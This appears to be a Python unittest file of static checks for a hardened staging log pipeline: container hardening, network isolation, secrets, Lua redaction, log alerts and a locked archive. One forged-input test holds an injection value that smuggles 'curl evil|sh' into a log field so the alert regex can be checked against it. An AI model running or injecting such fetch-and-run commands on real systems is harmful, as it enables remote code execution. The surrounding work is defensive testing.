"""Static checks for log collection, redaction and log alerts (P1-T9b, ADR-013): hardened services
in deploy/staging/compose.logs.yaml, VictoriaLogs reachable by the pipeline alone with its
deleting endpoints behind the operator's key, Fluent Bit reading the journal read-only and
redacting before anything leaves, the log alerts' labels, and the wiring in staging.sh.

The redaction itself and the alerts are tested by running them: scripts/check-logs.py.
Run: python -m unittest scripts/test_staging_logs.py (pre-commit hook "staging-logs-static")."""

import re
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
STAGING = ROOT / "deploy" / "staging"
LOGS = ROOT / "deploy" / "logs"


class _Loader(yaml.SafeLoader):
    pass


# Compose's merge tags (!override, !reset): read as the plain value
_Loader.add_multi_constructor("!", lambda loader, suffix, node: (
    loader.construct_sequence(node) if isinstance(node, yaml.SequenceNode)
    else loader.construct_mapping(node) if isinstance(node, yaml.MappingNode)
    else loader.construct_scalar(node)))


def load(path):
    return yaml.load(Path(path).read_text(), Loader=_Loader)


OVERLAY = load(STAGING / "compose.logs.yaml")
SVC = OVERLAY["services"]
ALL_COMPOSE = {f.name: load(f) for f in sorted(STAGING.glob("compose*.yaml"))}
FB = load(LOGS / "fluent-bit" / "fluent-bit.yaml")
FILTERS = load(LOGS / "fluent-bit" / "filters.yaml")
LUA = (LOGS / "fluent-bit" / "redact.lua").read_text()
ALERTS = {f.name: load(f) for f in sorted((LOGS / "alerts").glob("*.yml"))}
# The reference pack alert's whole-line pattern (deploy/logs/alerts/packs.yml, S1)
PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed$"
STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
DEPLOY_SH = (ROOT / "scripts" / "deploy.sh").read_text()
LONG_RUNNING = ("victorialogs", "fluent-bit", "vmalert")


def func(name):
    m = re.search(r"^%s\(\) \{(.*?)^\}" % re.escape(name), STAGING_SH, re.S | re.M)
    assert m, name
    return m.group(1)


def members(net):
    return {(f, s) for f, doc in ALL_COMPOSE.items() for s, spec in (doc.get("services") or {}).items()
            if net in (spec.get("networks") or [])}


class Hardening(unittest.TestCase):
    def test_services_hardened(self):
        for name in LONG_RUNNING:
            s = SVC[name]
            self.assertTrue(s["read_only"], name)
            self.assertEqual(s["cap_drop"], ["ALL"], name)
            self.assertNotIn("cap_add", s, name)
            self.assertIn("no-new-privileges:true", s["security_opt"], name)
            self.assertNotIn("privileged", s, name)
            self.assertNotIn("ports", s, name)
            self.assertNotRegex(s["user"], r"^0(:|$)", name)
            self.assertIn("mem_limit", s, name)
            self.assertEqual(s["restart"], "unless-stopped", name)
            self.assertEqual(s["logging"]["options"]["labels"], "com.docker.compose.service", name)

    def test_images_pinned(self):
        want = {"victorialogs": "victoriametrics/victoria-logs:v", "fluent-bit": "fluent/fluent-bit:",
                "vmalert": "victoriametrics/vmalert:v", "logs-data": "prom/alertmanager:v"}
        for name, prefix in want.items():
            self.assertTrue(SVC[name]["image"].startswith(prefix), name)
            self.assertRegex(SVC[name]["image"], r"@sha256:[0-9a-f]{64}$", name)
        # never a commercial build
        self.assertNotIn("enterprise", (STAGING / "compose.logs.yaml").read_text())

    def test_no_docker_socket_and_only_the_journal_from_the_host(self):
        text = (STAGING / "compose.logs.yaml").read_text()
        self.assertNotIn("docker.sock", text)
        for name in LONG_RUNNING:
            host = [v for v in SVC[name].get("volumes", []) if v.startswith("/")]
            if name == "fluent-bit":
                self.assertEqual(host, ["/var/log/journal:/var/log/journal:ro"])
            else:
                self.assertEqual(host, [], name)

    def test_one_off_only_fixes_ownership(self):
        s = SVC["logs-data"]
        self.assertEqual(s["network_mode"], "none")
        self.assertEqual(sorted(s["cap_add"]), ["CHOWN", "FOWNER"])
        self.assertEqual(s["restart"], "no")
        self.assertIn("logs-data", re.search(r"MON_ONESHOTS='([^']*)'", STAGING_SH).group(1).split("|"))


class Isolation(unittest.TestCase):
    def test_logs_network_members(self):
        """VictoriaLogs answers queries and deletes nothing without a key, but has no login at
        all for reading: only the pipeline and Prometheus may reach it."""
        net = OVERLAY["networks"]["logs"]
        self.assertTrue(net["internal"])
        self.assertEqual(net["ipam"]["config"][0]["subnet"], "${IHR_LOGS_NET:-10.203.0.32/28}")
        self.assertEqual(members("logs"), {("compose.logs.yaml", n) for n in ("victorialogs", "fluent-bit", "vmalert", "prometheus")}
                         | {("compose.logs-archive.yaml", "logs-archive"), ("compose.logs-archive.local.yaml", "logs-archive"),
                            # Grafana's read-only door (P1-T9d): reads /select/logsql/ only
                            ("compose.dashboards.yaml", "logs-reader")})

    def test_victorialogs_on_logs_alone(self):
        self.assertEqual(list(SVC["victorialogs"]["networks"]), ["logs"])
        self.assertEqual(SVC["fluent-bit"]["networks"], ["logs"])
        self.assertEqual(sorted(SVC["vmalert"]["networks"]), ["alerting", "logs"])

    def test_store_needs_a_password_and_allows_no_cross_origin_reads(self):
        """While the operator's SSH tunnel is open, a web page in their browser must not read the
        store (CORS), and DNS rebinding meets the password. P1-T9b review."""
        cmd = SVC["victorialogs"]["command"]
        for flag in ("-httpAuth.username=ihr-logs", "-httpAuth.password=file:///run/ihr-logs/http-password",
                     "-http.disableCORS", "-metricsAuthKey=file:///run/ihr-logs/metrics-key"):
            self.assertIn(flag, cmd)
        self.assertEqual(SVC["fluent-bit"]["env_file"], ["secrets/logs-shipper.env"])
        (out,) = FB["pipeline"]["outputs"]
        self.assertEqual((out["http_user"], out["http_passwd"]), ("ihr-logs", "${IHR_LOGS_HTTP_PASSWORD}"))
        vma = SVC["vmalert"]["command"]
        self.assertIn("-datasource.basicAuth.passwordFile=/run/ihr-logs/http-password", vma)
        self.assertNotIn("-datasource.basicAuth.password=", " ".join(vma))
        # secrets made once, mode 600, never printed; the smoke sends the password on stdin
        sec = func("logs_secrets")
        for name in ("logs-admin-key", "logs-http-password", "logs-shipper.env", "logs-metrics-key"):
            self.assertIn("write_secret " + name, sec)
        self.assertIn('< "$SECRETS/logs-http-password"', func("vl_get"))
        self.assertIn("reading the store without its password is refused", func("logs_smoke"))

    def test_deleting_needs_the_operators_key(self):
        cmd = SVC["victorialogs"]["command"]
        for flag in ("deleteAuthKey", "partitionManageAuthKey", "forceMergeAuthKey", "forceFlushAuthKey",
                     "logNewStreamsAuthKey", "flagsAuthKey", "pprofAuthKey"):
            self.assertIn("-%s=file:///run/ihr-logs/admin-key" % flag, cmd)
        self.assertIn("./secrets/logs-admin-key:/run/ihr-logs/admin-key:ro", SVC["victorialogs"]["volumes"])
        # nothing else gets the key
        for name, s in SVC.items():
            if name != "victorialogs":
                self.assertFalse([v for v in s.get("volumes", []) if "logs-admin-key" in v], name)
        self.assertIn("logs_secrets", func("monitoring_init"))
        up = func("monitoring_up")
        self.assertLess(up.index("logs_secrets"), up.index("monitoring_config"))

    def test_retention(self):
        cmd = SVC["victorialogs"]["command"]
        self.assertIn("-retentionPeriod=${IHR_LOGS_RETENTION_DAYS:-180}d", cmd)
        self.assertIn("-retention.maxDiskSpaceUsageBytes=${IHR_LOGS_MAX_SIZE:-20GiB}", cmd)

    def test_ops_tunnel_binds_this_machine_only(self):
        t = func("ops_tunnel")
        self.assertIn('-L "127.0.0.1:9428:$vl:9428"', t)
        self.assertIn('-L "127.0.0.1:8880:$vma:8880"', t)


class FluentBit(unittest.TestCase):
    def test_reads_the_journal_as_nobody_with_its_group(self):
        s = SVC["fluent-bit"]
        self.assertEqual(s["user"], "65534:65534")
        self.assertEqual(s["group_add"], ["${IHR_JOURNAL_GID:?}"])
        self.assertIn('IHR_JOURNAL_GID="$(getent group systemd-journal | cut -d: -f3)"', func("compose"))
        (inp,) = FB["pipeline"]["inputs"]
        self.assertEqual(inp["name"], "systemd")
        self.assertEqual(inp["path"], "/var/log/journal")
        self.assertTrue(inp["db"].startswith("/state/"))
        self.assertEqual(inp["storage.type"], "filesystem")
        self.assertNotIn("systemd_filter", inp)  # the whole server (owner, Q-O6)

    def test_redaction_runs_before_the_output(self):
        self.assertEqual(FB["includes"], ["filters.yaml"])
        filters = FILTERS["pipeline"]["filters"]
        # rules/logs.yml selects these by name: renaming one would silence LogRedactionDrops,
        # LogShippingFailing and LogLinesLost
        self.assertEqual([f["alias"] for f in filters], ["shape", "redact"])
        rules_text = (ROOT / "deploy" / "monitoring" / "prometheus" / "rules" / "logs.yml").read_text()
        self.assertIn('fluentbit_filter_drop_records_total{name=~"shape|redact"}', rules_text)
        self.assertIn('{name="victorialogs"}', rules_text)
        # at info it logs every flush, and that line would come back through the journal forever
        self.assertEqual(FB["service"]["log_level"], "warn")
        self.assertEqual([(f["name"], f["call"], f["match"]) for f in filters],
                         [("lua", "shape", "*"), ("lua", "redact", "*")])
        for f in filters:
            # protected mode (the default): a Lua error drops the record, never passes it raw
            self.assertNotIn("protected_mode", f)
            self.assertEqual(f["script"], "/fluent-bit/etc/ihr/redact.lua")
        self.assertNotIn("filters", FB["pipeline"])
        self.assertIn("../logs/fluent-bit:/fluent-bit/etc/ihr:ro", SVC["fluent-bit"]["volumes"])

    def test_output(self):
        (out,) = FB["pipeline"]["outputs"]
        self.assertEqual((out["name"], out["host"], out["port"]), ("http", "victorialogs", 9428))
        self.assertEqual(out["alias"], "victorialogs")
        self.assertEqual(out["uri"], "/insert/jsonline?_stream_fields=host,source,service&_msg_field=msg&_time_field=date")
        self.assertEqual(out["retry_limit"], "no_limits")
        self.assertIn("storage.total_limit_size", out)
        self.assertNotIn("tls", out)  # an internal network; nothing leaves the server

    def test_lua_never_prints_or_reaches_out(self):
        # print() would go to Fluent Bit's own log, which comes back through the journal raw
        for banned in ("print(", "io.", "os.", "require(", "require \"", "loadstring", "dofile"):
            self.assertNotIn(banned, LUA)
        self.assertIn("function shape(tag, ts, r)", LUA)
        self.assertIn("function redact(tag, ts, r)", LUA)
        # only an allow-list of journald fields is kept (no _CMDLINE, no capabilities)
        self.assertNotIn("_CMDLINE", LUA)

    def test_keycloak_user_name_rule(self):
        """Owner, Q-O7: the typed user name of a 'user not found' sign-in is dropped; a real
        account's is kept."""
        self.assertIn("local KC_NO_ACCOUNT = { user_not_found = true, invalid_user = true, user_not_found_by_email = true }", LUA)
        self.assertIn('local real_user = f.userId and f.userId ~= "" and f.userId ~= "null" and not KC_NO_ACCOUNT[f.error or ""]', LUA)
        self.assertIn('v = real_user and v or "<dropped>"', LUA)
        # event fields only from a strictly parsed line with Keycloak's fixed head
        self.assertIn("if not kv or not kc_head_ok(kv) then", LUA)
        self.assertIn('if r.source == "container" and r.service == "keycloak" then keycloak_event(r) end', LUA)
        self.assertIn('r._TRANSPORT == "journal" and r._COMM == "dockerd" and r._UID == "0"', LUA)
        # never Keycloak's events at TRACE (request URIs with codes, cookies)
        self.assertNotRegex((STAGING / "compose.yaml").read_text(), r"(?i)org\.keycloak\.events.{0,20}trace")


class Labels(unittest.TestCase):
    def test_every_logging_block_names_the_service(self):
        for f in sorted(STAGING.glob("compose*.yaml")):
            text = f.read_text()
            for m in re.finditer(r'(?m)^(\s*)tag: "indiehr/\{\{\.Name\}\}"\n', text):
                nxt = text[m.end():].splitlines()[0]
                self.assertEqual(nxt.strip(), "labels: com.docker.compose.service", f.name)
        self.assertIn('"labels": "com.docker.compose.service"', (ROOT / "deploy" / "host" / "bootstrap.sh").read_text())


class LogAlerts(unittest.TestCase):
    def rules(self):
        for fname, doc in ALERTS.items():
            for g in doc["groups"]:
                self.assertEqual(g["type"], "vlogs", fname)
                for r in g["rules"]:
                    yield fname, r

    def test_labels_and_text(self):
        """The address is named on purpose (owner, Q-O8), and only the checked client_ip field.
        The reference pack alert (P1-T15a) names only the hospital, read from our own fixed line."""
        names = []
        for fname, r in self.rules():
            names.append(r["alert"])
            self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
            by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
            if fname == "packs.yml":
                self.assertEqual(by, ["hospital"], r["alert"])
                # container lines (redact.lua) of the services that run --startup only (never the
                # web backend, which logs request paths), and our whole fixed line (S1)
                self.assertRegex(r["expr"], r"^_time:\d+h source:=container service:in\(migrate, celery\) "
                                 r'"ihr-packs: hospital=" \| extract_regexp "' + re.escape(PACKS_LINE) + r'" '
                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ', r["alert"])
                allowed = r"^\$(labels\.hospital|value)$"
                # the mailed command never carries text from the log line
                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
            else:
                self.assertLessEqual(set(by), {"client_ip"}, r["alert"])
                # container lines only: journald's own fields say Docker wrote them (redact.lua)
                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:=(keycloak|traefik) ", r["alert"])
                allowed = r"^\$(labels\.client_ip|value)$"
            for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                self.assertRegex(ref.strip(), allowed, r["alert"])
        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "PackApplyFailed", "RateLimitedAddress",
                                         "SignInLockoutStorm", "SignInLockoutsFromAddress"])

    def test_pack_line_is_ours_alone(self):
        """S1: the rule's regex takes only our own whole line with a slug-shaped hospital; text
        anyone can put in a request path or a longer line is never a hospital."""
        [expr] = [r["expr"] for f, r in self.rules() if f == "packs.yml"]
        self.assertIn('extract_regexp "%s"' % PACKS_LINE, expr)
        line = re.compile(PACKS_LINE)
        self.assertEqual(line.match("ihr-packs: hospital=alpha outcome=failed")["hospital"], "alpha")
        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-packs: hospital=fake outcome=failed" 404 179',
                       "Not Found: /api/ihr-packs: hospital=fake outcome=failed",
                       "ihr-packs: hospital=x;curl evil|sh; outcome=failed",
                       "ihr-packs: hospital=fake outcome=failed (and more)",
                       "ihr-packs: hospital=Fake outcome=failed",
                       "ihr-packs: hospital=ab outcome=failed",
                       "ihr-packs: hospital=beta outcome=deferred",
                       "ihr-packs: hospital=fake outcome=failed\nmore"):
            self.assertIsNone(line.search(forged), forged)

    def test_holds_and_routing(self):
        """The hold before mailing is part of each alert's meaning (README table); the per-address
        alerts are mailed at any hour (owner, Q-O9)."""
        holds = {r["alert"]: r.get("for") for _, r in self.rules()}
        self.assertEqual(holds, {"SignInLockoutsFromAddress": None, "SignInLockoutStorm": None,
                                 "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
                                 "PackApplyFailed": None})
        anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
        self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
        cfg = func("monitoring_config")
        route = cfg.index("matchers: ['notify=\"anytime\"']")
        self.assertLess(route, cfg.index("matchers: ['severity=\"warning\"']"))
        self.assertNotIn("active_time_intervals", cfg[route:route + 120])
        # lock-outs count accounts, not events; failed sign-ins count credential errors only
        exprs = {r["alert"]: r["expr"] for _, r in self.rules()}
        self.assertIn("count_uniq(kc_user)", exprs["SignInLockoutsFromAddress"])
        self.assertIn("count_uniq(kc_user)", exprs["SignInLockoutStorm"])
        self.assertIn("kc_error:in(invalid_user_credentials, user_not_found, invalid_user, user_temporarily_disabled, user_disabled)",
                      exprs["FailedSignInsFromAddress"])

    def test_vmalert_wiring(self):
        cmd = SVC["vmalert"]["command"]
        self.assertIn("-rule.defaultRuleType=vlogs", cmd)
        self.assertIn("-datasource.url=http://victorialogs:9428", cmd)
        self.assertIn("-notifier.url=http://${IHR_ALERTMANAGER_IP:-10.203.0.20}:9093", cmd)
        self.assertIn("../logs/alerts:/etc/vmalert/rules:ro", SVC["vmalert"]["volumes"])


class Wiring(unittest.TestCase):
    def test_staging_sh(self):
        self.assertIn('files+=(-f "$DIR/compose.monitoring.yaml" -f "$DIR/compose.logs.yaml")', func("compose"))
        self.assertIn("logs_smoke", func("monitoring_smoke"))
        up = func("monitoring_up")
        for s in LONG_RUNNING:
            self.assertIn(s, up)
        self.assertIn("logs_cap_metric", func("monitoring_textfile"))

    def test_deploy_ships_the_settings(self):
        self.assertRegex(DEPLOY_SH, r"git ls-files -z deploy/staging deploy/s3 deploy/monitoring deploy/logs ")

    def test_local_proof_overlay_covers_the_core_services(self):
        local = set(ALL_COMPOSE["compose.local.yaml"]["services"])
        journal = ALL_COMPOSE["compose.local-journal.yaml"]["services"]
        self.assertEqual(set(journal), local)
        for name, s in journal.items():
            self.assertEqual(s["logging"]["driver"], "journald", name)

    def test_backend_loggers_stay_on(self):
        text = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "settings" / "deployment.py").read_text()
        self.assertIn('LOGGING["disable_existing_loggers"] = False', text)


class Archive(unittest.TestCase):
    """The daily locked archive (P1-T9c, ADR-014)."""

    ARC = load(STAGING / "compose.logs-archive.yaml")["services"]["logs-archive"]

    def test_archiver_hardened_and_isolated(self):
        a = self.ARC
        self.assertTrue(a["read_only"])
        self.assertEqual(a["cap_drop"], ["ALL"])
        self.assertIn("no-new-privileges:true", a["security_opt"])
        self.assertEqual(a["user"], "${IHR_SECRETS_UID:?}:${IHR_SECRETS_GID:?}")
        self.assertNotIn("ports", a)
        # the store and its own way out; the local stand-in only in a proof
        self.assertEqual(a["networks"], ["logs", "archiveout"])
        local = load(STAGING / "compose.logs-archive.local.yaml")["services"]["logs-archive"]
        self.assertEqual(local["networks"], ["logs", "archiveout", "internal"])
        self.assertEqual(members("archiveout"), {("compose.logs-archive.yaml", "logs-archive"),
                                                 ("compose.logs-archive.local.yaml", "logs-archive")})
        self.assertEqual(a["env_file"], ["secrets/logs-archive.env"])
        self.assertIn("./secrets/logs-http-password:/run/ihr-logs/http-password:ro", a["volumes"])
        self.assertIn("../logs/archive:/opt/ihr-archive:ro", a["volumes"])

    def test_writer_key_can_never_delete(self):
        """The archive's key on the stand-in: add and read under logs/, nothing else (the owner's
        machine erases, Q-O12)."""
        import json as _json

        tpl = _json.loads((ROOT / "deploy" / "s3" / "s3.template.json").read_text())
        (ident,) = [i for i in tpl["identities"] if i["name"] == "ihr-log-archive"]
        self.assertNotIn("actions", ident)
        (pol,) = [p for p in tpl["policies"] if p["name"] == "ihr-log-archive"]
        actions = {a for st in _json.loads(pol["content"])["Statement"] for a in st["Action"]}
        self.assertFalse({a for a in actions if "Delete" in a or "Retention" in a or "Lock" in a and a.startswith("s3:Put")})
        self.assertLessEqual(actions, {"s3:PutObject", "s3:GetObject", "s3:GetObjectVersion", "s3:ListBucket",
                                       "s3:GetBucketObjectLockConfiguration", "s3:GetBucketVersioning"})
        # the server never runs the erasure: it is a one-off with the admin key from stdin
        self.assertIn("expire.py", func("logs_archive_expire"))
        self.assertNotIn("expire", " ".join(self.ARC["entrypoint"]))
        self.assertNotIn("ADMIN", (STAGING / "compose.logs-archive.yaml").read_text())

    def test_archive_bucket_locked_like_e2e(self):
        up = func("s3_up")
        self.assertIn("--log-archive", up)
        text = (ROOT / "deploy" / "s3" / "setup_buckets.py").read_text()
        self.assertIn('p.add_argument("--log-archive-mode", choices=sorted(STRENGTH), default="GOVERNANCE")', text)
        self.assertIn('p.add_argument("--log-archive-days", type=int, default=400)', text)

    def test_archive_key_and_encryption_key_handling(self):
        init = func("logs_archive_init")
        self.assertIn("write_secret logs-archive.env", init)
        self.assertIn('read -rsp "Secret key: " secret', init)
        self.assertIn("IFS= read -r key", init)
        self.assertIn("password manager", init)
        self.assertRegex(init, r"\^\[A-Za-z0-9_-\]\{43\}=\$")
        # erasure gets the bucket's address only, never the writer's or the encryption key
        exp = func("logs_archive_expire")
        self.assertIn("IHR_LOGS_ARCHIVE_ENDPOINT|IHR_LOGS_ARCHIVE_REGION|IHR_LOGS_ARCHIVE_BUCKET|IHR_LOGS_ARCHIVE_URI_STYLE", exp)

    def test_wiring(self):
        c = func("compose")
        self.assertIn('s3) files+=(-f "$DIR/compose.logs-archive.yaml") ;;', c)
        self.assertIn("logs-archive", func("monitoring_up"))
        self.assertIn("archive_exec check", func("logs_smoke"))
        self.assertIn("logs_archive_init --local", STAGING_SH)
        prom = load(ROOT / "deploy" / "monitoring" / "prometheus" / "prometheus.yml")
        jobs = {j["job_name"]: j for j in prom["scrape_configs"]}
        self.assertEqual(jobs["logs-archive"]["file_sd_configs"][0]["files"], ["/etc/prometheus/targets/logs-archive.json"])
        rules = (ROOT / "deploy" / "monitoring" / "prometheus" / "rules" / "logs.yml").read_text()
        for name in ("LogArchiveBehind", "LogArchiveFailing", "LogArchiveNotAuthentic", "LogArchiveErasureOverdue"):
            self.assertIn("alert: " + name, rules)


if __name__ == "__main__":
    unittest.main()
